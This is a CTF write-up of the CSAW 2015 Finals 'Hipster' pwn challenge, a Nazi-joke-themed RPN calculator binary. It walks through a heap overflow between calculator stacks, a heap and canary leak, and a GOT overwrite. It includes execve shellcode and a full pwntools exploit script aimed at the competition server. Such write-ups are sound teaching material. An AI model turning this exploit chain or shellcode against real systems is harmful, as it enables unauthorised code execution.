

### TL; DR
* Overflow
* Shellcode
* Hitler

CSAW CTF Finals were really dope, not just because we had [Pwnadventure Z](https://www.youtube.com/watch?v=3Q1V7AUD1JQ), but also because of all the really cool people that were there.

Hipster (or Hipster Hitler) was a basic exploitation challenge that was fun to exploit. It is more or less similar to Contacts which appeared in CSAW CTF Prelims.

Let's check it out:

{% highlight bash lineanchors %}
[vagrant@kamino csaw2015finals]$ file hipster
hipster: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b23801cfaa0d9395b962e7115b15f85de01b22ca, stripped
{% endhighlight %}

{% highlight bash lineanchors %}
[vagrant@kamino csaw2015finals]$ ~/Template/checksec.sh --file hipster
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   hipster
{% endhighlight %}

NX is disabled which suggests that we are more than likely gonna wanna be using shellcode (unless they are tryna trick us :3).

Now let's checkout what this thing actually looks like:

{% highlight raw lineanchors %}
[vagrant@kamino csaw2015finals]$ ./hipster
Sieg Heil!
Welcome to Hipster Hitler's Pocket Calculator!
My computing resources await you, mein Führer.
We now use Reverse Polish Notation as a result of our recent conquest of Poland.
All commands are prefixed with ':'.
Type :help for a list of commands.
==> :help
His Excellency's available commands:
top  => Display top value of the currently selected stack.
new  => Create a new stack and switch to it.
del  => Delete currently selected stack.
disp => Display all values on stack.
next => Switch between active stacks.
quit => Exit the calculator.
==>
{% endhighlight %}

So from inital inspection, this appears to be a stack based calculator in which you can create different different calculation stacks. And apparently "Reverse Polish Notation" is just postfix notation which just makes it easier to program a stack based calculator.

Given that this is a calculator themed for Hitler, I figured that the rest of strings in this binary were also pretty funny:

{% highlight nasm lineanchors %}
.rodata:0804A322 aThatCommandIsN db 'That command is not yet implemented, mein F++hrer!',0Ah
.rodata:0804A322                                         ; DATA XREF: sub_80490E0+F8o
.rodata:0804A322                 db 'Please do not feed me to the dogs!',0Ah,0
.rodata:0804A379 aCaughtPossible db 'Caught possible Polish rebel intruder, mein F++hrer!',0Ah
.rodata:0804A379                                         ; DATA XREF: sub_8049280+3Bo
.rodata:0804A379                 db 'I shall execute him immediately...',0Ah,0
.rodata:0804A3D2 aSiegHeilWelcom db 'Sieg Heil!',0Ah     ; DATA XREF: sub_8049450+Bo
.rodata:0804A3D2                 db 'Welcome to Hipster Hitler',27h,'s Pocket Calculator!',0Ah
.rodata:0804A3D2                 db 'My computing resources await you, mein F++hrer.',0Ah
.rodata:0804A3D2                 db 'We now use Reverse Polish Notation as a result of our recent conq'
.rodata:0804A3D2                 db 'uest of Poland.',0Ah
.rodata:0804A3D2                 db 'All commands are prefixed with ',27h,':',27h,'.',0Ah
.rodata:0804A3D2                 db 'Type :help for a list of commands.',0Ah,0
.rodata:0804A4D5 asc_804A4D5     db '==> ',0             ; DATA XREF: sub_8049480+82o
.rodata:0804A4DA aFarewallMeinFH db 'Farewall, mein F++hrer!',0Ah
.rodata:0804A4DA                                         ; DATA XREF: sub_8049480+11Co
.rodata:0804A4DA                 db 'Have a good time in France!',0Ah,0
.rodata:0804A50F aUnableToSetSig db 'Unable to set SIGCHLD handler',0
.rodata:0804A50F                                         ; DATA XREF: .text:08049640o
.rodata:0804A52D aUnableToCreate db 'Unable to create socket',0 ; DATA XREF: .text:0804976Eo
.rodata:0804A545 aUnableToSetSoc db 'Unable to set socket reuse option',0
.rodata:0804A545                                         ; DATA XREF: .text:080497E1o
.rodata:0804A567 aUnableToBindSo db 'Unable to bind socket',0 ; DATA XREF: .text:08049883o
.rodata:0804A567                                         ; .text:0804997Eo
.rodata:0804A57D aUnableToListen db 'Unable to listen on socket',0
.rodata:0804A57D                                         ; DATA XREF: .text:080499D8o
.rodata:0804A598 ; char aUnableToFindUs[]
.rodata:0804A598 aUnableToFindUs db 'Unable to find user',0 ; DATA XREF: sub_8049C00+25o
.rodata:0804A5AC ; char aUnableToRemove[]
.rodata:0804A5AC aUnableToRemove db 'Unable to remove extra groups',0
.rodata:0804A5AC                                         ; DATA XREF: sub_8049C00+64o
.rodata:0804A5CA ; char aUnableToChange[]
.rodata:0804A5CA aUnableToChange db 'Unable to change GID',0 ; DATA XREF: sub_8049C00+95o
.rodata:0804A5DF ; char aUnableToChan_0[]
.rodata:0804A5DF aUnableToChan_0 db 'Unable to change UID',0 ; DATA XREF: sub_8049C00+C6o
.rodata:0804A5F4 ; char aUnableToChan_1[]
.rodata:0804A5F4 aUnableToChan_1 db 'Unable to change current directory',0
.rodata:0804A5F4                                         ; DATA XREF: sub_8049C00+F7o
.rodata:0804A617 ; char file[]
.rodata:0804A617 file            db '/dev/urandom',0     ; DATA XREF: sub_8049B20+11o
{% endhighlight %}

...See something interesting in there?
Well for starters at `0804A617` we have a mention of `/dev/urandom` which suggests some sort of random values being read in. But even more interesting is that there are `Unable to bind socket` and `Unable to listen on socket` which only appear in a server application, but this isn't a server... I guess we will keep our eyes open for any other mention of this socket code.

So the first thing we should really just do is play around with the program and see if we can get an easy crash (always a good thing to try first, you can almost always get a crash doing this in exploitation problems).

Going on a hunch about how this program stored its stacks, I got a crash pretty quickly.

<pre>
[vagrant@kamino csaw2015finals]$ ./hipster
Sieg Heil!
Welcome to Hipster Hitler's Pocket Calculator!
My computing resources await you, mein Führer.
We now use Reverse Polish Notation as a result of our recent conquest of Poland.
All commands are prefixed with ':'.
Type :help for a list of commands.
==> :new
Switching to new stack, mein Führer.
==> :new
Switching to new stack, mein Führer.
==> :next
Switched to stack #0.
==> 111111111111111111111111111111111111111111111111111111111111111111111111111111111111
==> ==> ==> ==> ==> ==> :next
Switched to stack #1.
==> :top
zsh: segmentation fault  ./hipster

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x804b8b0 ("Switched to stack #1.\n")
ESI: 0x1
[-------------------------------------code-------------------------------------]
=> 0x8048b21:   mov    esi,DWORD PTR [esi-0x4]
</pre>

So we can overflow from one stack into another as it looks like the program is attempting to dereference a `1` which is what we input into the program.

Now we should checkout how these stacks are actually stored in memory.

Poking around `create_stack` (remember, there are no symbols in this program so I'm logically naming all these functions) we can see how big each stack is:

{% highlight c lineanchors %}
current_stack = malloc(168u);
{% endhighlight %}

We also see `dword_804B8F0` being stored in the location pointed to by `esi` (a pointer to the current stack)

{% highlight nasm lineanchors %}
.text:08048DEB:     mov     edx, ds:dword_804B8F0
.text:08048DF1:     mov     esi, [ebp+var_C]
.text:08048DF4:     mov     esi, ds:ptr[esi*4]
.text:08048DFB:     mov     [esi], edx
{% endhighlight %}

If we check the xrefs of this value we see it is first assigned here:

{% highlight nasm lineanchors %}
.text:080494F3:     call    _rand
.text:080494F8:     mov     ds:dword_804B8F0, eax
{% endhighlight %}

And checked in `do_calcuation`:

{% highlight nasm lineanchors %}
.text:080492A0:     mov     eax, ds:dword_804B888
.text:080492A5:     mov     eax, ds:ptr[eax*4]
.text:080492AC:     mov     eax, [eax]
.text:080492AE:     cmp     eax, ds:dword_804B8F0
.text:080492B4:     jz      short loc_80492EB
{% endhighlight %}

Just a guess right now, but it looks like this value is some sort of stack canary that checks if we have overflowed from one stack into another. So we are going to have to leak this value out somehow before we do our overflow.

Something else that is interesting that is happening in `create_stack` is:

{% highlight nasm lineanchors %}
.text:08048DD1:     mov     edx, [ebp+var_C]   ; edx is the index of the current stack
.text:08048DD4:     mov     edx, ds:ptr[edx*4] ; edx is a pointer to the current stack
.text:08048DDB:     add     edx, 8             ; Go 8 bytes into the current stack
.text:08048DDE:     mov     esi, [ebp+var_C]   ; esi is the index of the current stack
.text:08048DE1:     mov     esi, ds:ptr[esi*4] ; esi is a pointer to the current stack
.text:08048DE8:     mov     [esi+4], edx       ; store a pointer 8 bytes into the current stack
                                               ; into our stack
{% endhighlight %}

Here we see the current stack storing a pointer to 8 bytes into itself in itself. Looking at `get_stack_top` we see that this pointer is a pointer to the top of the stack.

{% highlight nasm lineanchors %}
.text:08048B17:     mov     esi, ds:ptr[esi*4]
.text:08048B1E:     mov     esi, [esi+4]
.text:08048B21:     mov     esi, [esi-4]
.text:08048B24:     mov     [esp], eax      ; s
.text:08048B27:     mov     dword ptr [esp+4], 40h ; maxlen
.text:08048B2F:     mov     [esp+8], edx    ; format
.text:08048B33:     mov     [esp+0Ch], esi
.text:08048B37:     mov     [ebp+var_8], ecx
.text:08048B3A:     call    _snprintf
{% endhighlight %}

But what is interesting here, is that in `create_stack` it stored a pointer 8 bytes into the stack, but when we go to print out the top value, `mov     esi, [esi-4]` we subtract 4 from this pointer. Let's draw out what we conceptualize a stack to look like at this point:

<pre>
[-------- top --------]
stack+0    random value
stack+4    pointer to top of stack
stack+8    numbers and stuff
...
stack+164  numbers and stuff
[-------- end --------]
</pre>

So `8 bytes into our stack - 4` is just 4 bytes in, which is a pointer to the top of the stack. This is important as we will use this to read out the random value from a stack we create.

<pre>
[vagrant@kamino csaw2015finals]$ ./hipster
Sieg Heil!
Welcome to Hipster Hitler's Pocket Calculator!
My computing resources await you, mein Führer.
We now use Reverse Polish Notation as a result of our recent conquest of Poland.
All commands are prefixed with ':'.
Type :help for a list of commands.
==> :new
Switching to new stack, mein Führer.
==> :top
154038288
==> ^C
[vagrant@kamino csaw2015finals]$ python -c 'print hex(154038288)'
0x92e7010
</pre>

Kewl, so since the allocation of each stack is a multiple of 4, we can pretty much be sure that each stack will be allocated right next to each other. Therefore, with the leak that we have of the top of the stack for the first allocation, we will have to throw in `0xac` bytes into stack #1 to get to the point where we are about to overflow into stack #2s top of stack pointer. We will then put a pointer to point to stack #1s random value.

<pre>
[-------- top --------]
stack1+0    random value
stack1+4    pointer to top of stack
stack1+8    shellcode and nops
...
stack1+164  shellcode and nops
[-------- end --------]
[-------- top --------]
stack2+0    shellcode and nops
stack2+4    overflowed with pointer to stack1+0
stack2+8    numbers and stuff
...
stack2+164  numbers and stuff
[-------- end --------]
</pre>

I also decided to just use stack #1 as the place to store the shellcode and just pad it with nops. Since we are just using a stack based calculator, you have to come up with some way to write arbiturary values by using math. `write_num` in the exploit script is a demonstration on how to do this.

{% highlight python lineanchors %}
# Create stack #2 in order to leak random value
new_stack(r)

# Getting the next stack puts us back at stack #1
next_stack(r)

# Throw our shellcode into stack #1
padding = string.ljust(shellcode, 0xac, "\x90")
write_vals(r, padding)

# Position stack #2s top of stack to point to random value
random_val_offset = -0xb4
write_num(r, heap_addr + random_val_offset)

# Shift back to stack #2 and read random value from top of stack
next_stack(r)
random_value = int(top_val(r).split("\n")[0], 10)
print "[+] Got random value: 0x%08x" % random_value
{% endhighlight %}

Now that we have the random value, we can start writing to an arbituary location by setting the top of stack to be our location of choice. Since we already have our shellcode in the program at this point, we just need a function pointer to point to our first stack. The GOT is a great place to overwrite for this :3 The rest of the exploit is pretty self explanatory.

Turns out the socket code was just left over from another version of the challenge, so nothing super secret about it :3

Here is the full exploit script ([pwntools is <3](http://pwntools.readthedocs.org)):

{% highlight python lineanchors %}
from pwn import *

#context.log_level = "DEBUG"

#r = remote("localhost", 2323)
r = remote("54.164.94.180", 1939)
pause()

elf = ELF("hipster")
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52" \
            "\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e" \
            "\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

def new_stack(r):
    r.sendline(":new")
    return r.recvuntil("==> ")

def next_stack(r):
    r.sendline(":next")
    return r.recvuntil("==> ")

def top_val(r):
    r.sendline(":top")
    return r.recvuntil("==> ")

def disp_stack(r):
    r.sendline(":disp")
    return r.recvuntil("==> ")

def del_stack(r):
    r.sendline(":del")

def send_val(r, v):
    r.sendline(str(v))
    return r.recvuntil("==> ")

def send_vals(r, v):
    for a in [v[i:i+14] for i in range(0, len(v), 14)]:
        send_val(r, a)

def write_num(r, num):
    out = []
    while num > 9:
        expression = []
        total = 0
        for i in range(9, 1, -1):
            while num != total and num >= total*i:
                if total:
                    total *= i
                else:
                    total = i
                expression.append(str(i))
            if num == total:
                break
        num -= total
        e = "".join(expression) + ("*" * (len(expression) - 1))
        out.append(e)
    o = "".join(out) + ("+" * (len(out) - 1)) + str(num) + "+"
    send_vals(r, o)

def write_vals(r, v):
    for a in [v[i:i+4] for i in range(0, len(v), 4)]:
        num = u32(a)
        write_num(r, num)

def leak_heap_addr(r):
    new_stack(r)
    return top_val(r)

# Create stack #1 to leak heap address
new_stack(r)
r.recvuntil("==> ")

heap_addr = int(leak_heap_addr(r).split("\n")[0], 10)
print "[+] Leaked heap addr: 0x%08x" % heap_addr

# Create stack #2 in order to leak random value
new_stack(r)

# Getting the next stack puts us back at stack #1
next_stack(r)

# Throw our shellcode into stack #1
padding = string.ljust(shellcode, 0xac, "\x90")
write_vals(r, padding)

# Position stack #2s top of stack to point to random value
random_val_offset = -0xb4
write_num(r, heap_addr + random_val_offset)

# Shift back to stack #2 and read random value from top of stack
next_stack(r)
random_value = int(top_val(r).split("\n")[0], 10)
print "[+] Got random value: 0x%08x" % random_value

overwrite_got = elf.got["snprintf"]

# Create stack #3 and #4
new_stack(r)
new_stack(r)

# Shift from stack #4 back to stack #3
next_stack(r) # Stack 1
next_stack(r) # Stack 2
next_stack(r) # Stack 3

# Pad stack #3 until we overwrite into stack #4
for i in range(0, (0xac / 4) - 1):
    send_val(r, 1)

# Write our random value and address we want to write to
# to the top of the stack
write_num(r, random_value)
write_num(r, overwrite_got)

# Shift to stack #4 (really shifting to the GOT address of snprintf)
next_stack(r)
# Write the address of the first heap to the snprintf GOT entry
first_heap_addr = (heap_addr ^ (heap_addr & 0xff)) | 0x10
write_num(r, first_heap_addr)

# Trigger a call to snprintf
del_stack(r)

# Get our shell <3
r.interactive()
{% endhighlight %}
